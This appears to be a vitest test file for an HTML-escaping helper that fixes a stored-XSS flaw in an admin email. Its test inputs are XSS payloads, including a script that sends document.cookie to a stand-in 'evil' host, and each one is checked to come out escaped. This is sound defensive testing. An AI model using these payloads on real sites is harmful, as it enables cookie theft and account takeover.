/**
 * __tests__/html-escape.test.ts
 *
 * Covers escapeHtml() added in Phase 0.9 to fix the stored-XSS in
 * /api/leads admin notification email. Any user-controlled string
 * interpolated into an HTML email body must flow through this helper.
 */
import { describe, test, expect } from 'vitest';
import { escapeHtml } from '@/lib/utils';

describe('escapeHtml', () => {
  test('escapes ampersand first (order matters)', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('A & B & C')).toBe('A &amp; B &amp; C');
  });

  test('escapes < and > tags', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
    expect(escapeHtml('1 < 2 > 0')).toBe('1 &lt; 2 &gt; 0');
  });

  test('escapes double quotes and single quotes', () => {
    expect(escapeHtml('"quoted"')).toBe('&quot;quoted&quot;');
    expect(escapeHtml("it's mine")).toBe('it&#39;s mine');
  });

  test('blocks img onerror attack vector', () => {
    const attack = '<img src=x onerror=alert(1)>';
    const safe = escapeHtml(attack);
    // Angle brackets are entity-encoded — the browser renders the
    // literal string "<img src=x onerror=alert(1)>" instead of parsing
    // it as HTML. The word "onerror" survives as text, but attributes
    // can only fire inside a live tag.
    expect(safe).not.toContain('<img');
    expect(safe).toBe('&lt;img src=x onerror=alert(1)&gt;');
  });

  test('blocks javascript: href attack vector', () => {
    const attack = '<a href="javascript:alert(1)">click</a>';
    const safe = escapeHtml(attack);
    expect(safe).not.toContain('<a href');
    expect(safe).toContain('&lt;a href=&quot;javascript:');
  });

  test('handles nested ampersand + entity (double-escape safety)', () => {
    // Already-escaped input should be double-escaped, not collapsed,
    // because escapeHtml never decodes — only encodes.
    expect(escapeHtml('&amp;')).toBe('&amp;amp;');
  });

  test('accepts numbers + booleans via String() coercion', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(true)).toBe('true');
  });

  test('returns empty string for null / undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  test('preserves safe content unchanged', () => {
    expect(escapeHtml('Hello, World!')).toBe('Hello, World!');
    expect(escapeHtml('user@example.com')).toBe('user@example.com');
    expect(escapeHtml('12345 Main St, Apt 4')).toBe('12345 Main St, Apt 4');
  });

  test('combined entities — full /api/leads body.message attack payload', () => {
    const attack =
      '<script>fetch("https://evil/"+document.cookie)</script><img src=x onerror="location=\'https://evil\'">';
    const safe = escapeHtml(attack);
    // No live HTML tags after escaping
    expect(safe).not.toMatch(/<[a-z]/i);
    // Angle brackets are entities
    expect(safe.match(/&lt;/g)?.length).toBeGreaterThan(0);
    expect(safe.match(/&gt;/g)?.length).toBeGreaterThan(0);
    // No literal quote or apostrophe characters survive — all were
    // converted to &quot; or &#39;.
    expect(safe).not.toContain('"');
    expect(safe).not.toContain("'");
  });
});
